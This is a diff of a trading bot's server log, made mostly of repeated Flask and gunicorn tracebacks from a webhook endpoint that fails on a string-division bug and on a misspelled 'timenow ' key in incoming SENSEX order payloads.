-[2024-05-24 06:15:27 +0000] [2521] [ERROR] Exception in worker process
-Traceback (most recent call last):
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/gunicorn/workers/sync.py", line 134, in handle
-    req = next(parser)
-          ^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/gunicorn/http/parser.py", line 42, in __next__
-    self.mesg = self.mesg_class(self.cfg, self.unreader, self.source_addr, self.req_count)
-                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/gunicorn/http/message.py", line 257, in __init__
-    super().__init__(cfg, unreader, peer_addr)
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/gunicorn/http/message.py", line 60, in __init__
-    unused = self.parse(self.unreader)
-             ^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/gunicorn/http/message.py", line 281, in parse
-    self.parse_request_line(line)
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/gunicorn/http/message.py", line 445, in parse_request_line
-    raise InvalidHTTPVersion(self.version)
-gunicorn.http.errors.InvalidHTTPVersion: <exception str() failed>
-
-During handling of the above exception, another exception occurred:
-
-Traceback (most recent call last):
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/gunicorn/arbiter.py", line 609, in spawn_worker
-    worker.init_process()
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/gunicorn/workers/base.py", line 142, in init_process
-    self.run()
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/gunicorn/workers/sync.py", line 126, in run
-    self.run_for_one(timeout)
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/gunicorn/workers/sync.py", line 70, in run_for_one
-    self.accept(listener)
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/gunicorn/workers/sync.py", line 32, in accept
-    self.handle(listener, client, addr)
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/gunicorn/workers/sync.py", line 158, in handle
-    self.handle_error(req, client, addr, e)
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/gunicorn/workers/base.py", line 225, in handle_error
-    mesg = "Invalid HTTP Version '%s'" % str(exc)
-                                         ^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/gunicorn/http/errors.py", line 56, in __str__
-    return "Invalid HTTP Version: %r" % self.version
-           ~~~~~~~~~~~~~~~~~~~~~~~~~~~^~~~~~~~~~~~~~
-TypeError: not all arguments converted during string formatting
-[2024-05-24 06:15:27 +0000] [2521] [INFO] Worker exiting (pid: 2521)
-[2024-05-24 06:15:28 +0000] [2482] [ERROR] Worker (pid:2521) exited with code 255
-[2024-05-24 06:15:28 +0000] [2482] [ERROR] Worker (pid:2521) exited with code 255.
-[2024-05-24 06:15:28 +0000] [2982] [INFO] Booting worker with pid: 2982
-[2024-05-24 06:28:02,446] ERROR in app: Exception on /webhook [POST]
+  File "/home/ubuntu/tradebot/trading-bot/main.py", line 88, in webhook
+    timenow_ist = convert_utc_to_ist(timenow_utc)
+                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/tradebot/trading-bot/main.py", line 62, in convert_utc_to_ist
+    utc_time = datetime.strptime(utc_time_str, "%Y-%m-%dT%H:%M:%SZ")
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+TypeError: strptime() argument 1 must be str, not None
+2024-06-11 05:27:00,871 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 05:27:00] "[35m[1mPOST /webhook HTTP/1.0[0m" 500 -
+2024-06-11 05:27:06,254 - __main__ - INFO - Received request: b'{\n"order_id": "BuyPE",\n    "ticker": "SENSEX",\n    "timenow ": "2024-06-11T05:27:00Z",\n    "strategy.order.price": "76682.64",\n    "strategy.order.comment": "BuyPE",\n    "strategy.order.action": "sell"\n}\n'
+2024-06-11 05:27:06,254 - __main__ - INFO - Received data: {'order_id': 'BuyPE', 'ticker': 'SENSEX', 'timenow ': '2024-06-11T05:27:00Z', 'strategy.order.price': '76682.64', 'strategy.order.comment': 'BuyPE', 'strategy.order.action': 'sell'}
+2024-06-11 05:27:06,254 - main - ERROR - Exception on /webhook [POST]
 Traceback (most recent call last):
   File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
     response = self.full_dispatch_request()
@@ -267,11 +275,17 @@ Traceback (most recent call last):
   File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
     return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 06:28:07,812] ERROR in app: Exception on /webhook [POST]
+  File "/home/ubuntu/tradebot/trading-bot/main.py", line 88, in webhook
+    timenow_ist = convert_utc_to_ist(timenow_utc)
+                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/tradebot/trading-bot/main.py", line 62, in convert_utc_to_ist
+    utc_time = datetime.strptime(utc_time_str, "%Y-%m-%dT%H:%M:%SZ")
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+TypeError: strptime() argument 1 must be str, not None
+2024-06-11 05:27:06,255 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 05:27:06] "[35m[1mPOST /webhook HTTP/1.0[0m" 500 -
+2024-06-11 05:27:11,570 - __main__ - INFO - Received request: b'{\n"order_id": "BuyPE",\n    "ticker": "SENSEX",\n    "timenow ": "2024-06-11T05:27:00Z",\n    "strategy.order.price": "76682.64",\n    "strategy.order.comment": "BuyPE",\n    "strategy.order.action": "sell"\n}\n'
+2024-06-11 05:27:11,570 - __main__ - INFO - Received data: {'order_id': 'BuyPE', 'ticker': 'SENSEX', 'timenow ': '2024-06-11T05:27:00Z', 'strategy.order.price': '76682.64', 'strategy.order.comment': 'BuyPE', 'strategy.order.action': 'sell'}
+2024-06-11 05:27:11,570 - main - ERROR - Exception on /webhook [POST]
 Traceback (most recent call last):
   File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
     response = self.full_dispatch_request()
@@ -285,11 +299,17 @@ Traceback (most recent call last):
   File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
     return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 06:28:13,125] ERROR in app: Exception on /webhook [POST]
+  File "/home/ubuntu/tradebot/trading-bot/main.py", line 88, in webhook
+    timenow_ist = convert_utc_to_ist(timenow_utc)
+                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/ubuntu/tradebot/trading-bot/main.py", line 62, in convert_utc_to_ist
+    utc_time = datetime.strptime(utc_time_str, "%Y-%m-%dT%H:%M:%SZ")
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+TypeError: strptime() argument 1 must be str, not None
+2024-06-11 05:27:11,571 - werkzeug - INFO - 127.0.0.1 - - [11/Jun/2024 05:27:11] "[35m[1mPOST /webhook HTTP/1.0[0m" 500 -
+2024-06-11 05:27:16,887 - __main__ - INFO - Received request: b'{\n"order_id": "BuyPE",\n    "ticker": "SENSEX",\n    "timenow ": "2024-06-11T05:27:00Z",\n    "strategy.order.price": "76682.64",\n    "strategy.order.comment": "BuyPE",\n    "strategy.order.action": "sell"\n}\n'
+2024-06-11 05:27:16,887 - __main__ - INFO - Received data: {'order_id': 'BuyPE', 'ticker': 'SENSEX', 'timenow ': '2024-06-11T05:27:00Z', 'strategy.order.price': '76682.64', 'strategy.order.comment': 'BuyPE', 'strategy.order.action': 'sell'}
+2024-06-11 05:27:16,887 - main - ERROR - Exception on /webhook [POST]
 Traceback (most recent call last):
   File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
     response = self.full_dispatch_request()
@@ -303,516 +323,719 @@ Traceback (most recent call last):
   File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
     return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 06:28:18,444] ERROR in app: Exception on /webhook [POST]
-Traceback (most recent call last):
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
-    response = self.full_dispatch_request()
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 882, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 880, in full_dispatch_request
-    rv = self.dispatch_request()
-         ^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 06:34:02,033] ERROR in app: Exception on /webhook [POST]
-Traceback (most recent call last):
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
-    response = self.full_dispatch_request()
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 882, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 880, in full_dispatch_request
-    rv = self.dispatch_request()
-         ^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 06:34:07,378] ERROR in app: Exception on /webhook [POST]
-Traceback (most recent call last):
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
-    response = self.full_dispatch_request()
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 882, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 880, in full_dispatch_request
-    rv = self.dispatch_request()
-         ^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 06:34:12,702] ERROR in app: Exception on /webhook [POST]
-Traceback (most recent call last):
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
-    response = self.full_dispatch_request()
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 882, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 880, in full_dispatch_request
-    rv = self.dispatch_request()
-         ^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 06:34:18,017] ERROR in app: Exception on /webhook [POST]
-Traceback (most recent call last):
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
-    response = self.full_dispatch_request()
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 882, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 880, in full_dispatch_request
-    rv = self.dispatch_request()
-         ^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 06:40:00,728] ERROR in app: Exception on /webhook [POST]
-Traceback (most recent call last):
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
-    response = self.full_dispatch_request()
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 882, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 880, in full_dispatch_request
-    rv = self.dispatch_request()
-         ^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 06:40:08,030] ERROR in app: Exception on /webhook [POST]
-Traceback (most recent call last):
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
-    response = self.full_dispatch_request()
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 882, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 880, in full_dispatch_request
-    rv = self.dispatch_request()
-         ^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 06:40:13,425] ERROR in app: Exception on /webhook [POST]
-Traceback (most recent call last):
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
-    response = self.full_dispatch_request()
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 882, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 880, in full_dispatch_request
-    rv = self.dispatch_request()
-         ^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 06:40:18,739] ERROR in app: Exception on /webhook [POST]
-Traceback (most recent call last):
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
-    response = self.full_dispatch_request()
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 882, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 880, in full_dispatch_request
-    rv = self.dispatch_request()
-         ^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 06:46:02,407] ERROR in app: Exception on /webhook [POST]
-Traceback (most recent call last):
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
-    response = self.full_dispatch_request()
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 882, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 880, in full_dispatch_request
-    rv = self.dispatch_request()
-         ^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 06:46:07,932] ERROR in app: Exception on /webhook [POST]
-Traceback (most recent call last):
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
-    response = self.full_dispatch_request()
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 882, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 880, in full_dispatch_request
-    rv = self.dispatch_request()
-         ^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 06:46:13,252] ERROR in app: Exception on /webhook [POST]
-Traceback (most recent call last):
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
-    response = self.full_dispatch_request()
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 882, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 880, in full_dispatch_request
-    rv = self.dispatch_request()
-         ^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 06:46:18,571] ERROR in app: Exception on /webhook [POST]
-Traceback (most recent call last):
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
-    response = self.full_dispatch_request()
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 882, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 880, in full_dispatch_request
-    rv = self.dispatch_request()
-         ^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 06:54:01,734] ERROR in app: Exception on /webhook [POST]
-Traceback (most recent call last):
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
-    response = self.full_dispatch_request()
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 882, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 880, in full_dispatch_request
-    rv = self.dispatch_request()
-         ^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 06:54:07,090] ERROR in app: Exception on /webhook [POST]
-Traceback (most recent call last):
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
-    response = self.full_dispatch_request()
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 882, in full_dispatch_request
-    rv = self.handle_user_exception(e)
-         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 880, in full_dispatch_request
-    rv = self.dispatch_request()
-         ^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 865, in dispatch_request
-    return self.ensure_sync(self.view_functions[rule.endpoint])(**view_args)  # type: ignore[no-any-return]
-           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/main.py", line 70, in webhook
-    price = int(int(actual_price/100)*100)
-                    ~~~~~~~~~~~~^~~~
-TypeError: unsupported operand type(s) for /: 'str' and 'int'
-[2024-05-24 06:54:12,404] ERROR in app: Exception on /webhook [POST]
-Traceback (most recent call last):
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 1473, in wsgi_app
-    response = self.full_dispatch_request()
-               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File "/home/ubuntu/tradebot/trading-bot/venv/lib/python3.12/site-packages/flask/app.py", line 882, in full_dispatch_request
-    rv = self.handle_user_exception(e)
